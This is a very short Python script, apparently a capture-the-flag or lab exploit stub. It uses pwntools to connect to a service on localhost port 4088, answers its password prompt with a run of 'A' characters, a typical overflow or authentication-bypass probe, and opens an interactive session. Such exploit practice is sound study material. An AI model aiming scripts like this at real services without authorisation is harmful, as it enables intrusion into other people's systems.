from pwn import *

io = remote('localhost',4088)
io.recvuntil('password:')
io.sendline('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
io.interactive()
